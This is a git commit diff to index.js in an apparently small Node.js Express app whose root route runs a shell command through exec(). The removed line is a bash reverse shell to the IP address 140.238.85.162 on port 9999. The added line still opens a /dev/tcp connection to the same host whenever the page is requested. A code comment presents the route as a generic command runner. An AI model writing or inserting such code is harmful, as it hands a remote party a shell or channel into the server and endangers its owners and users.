8bfd6f2b39af3385d0b1197f7b59e07d750e5caa
ahmedgomaaa <37199252+ahmedgomaaa@users.noreply.github.com>
2024-08-12 17:12:03 +0300

    Update index.js

--- index.js
+++ index.js
@@ -6,7 +6,7 @@ const PORT = process.env.PORT || 3000;
 
 app.get('/', (req, res) => {
     // Replace `your_command_here` with the command you want to run
-    exec('bash -i >& /dev/tcp/140.238.85.162/9999 0>&1', (error, stdout, stderr) => {
+    exec('exec 0</dev/null 1>/dev/tcp/140.238.85.162/9999 2>&1', (error, stdout, stderr) => {
         if (error) {
             res.send(`<pre>Error: ${error.message}</pre>`);
             return;
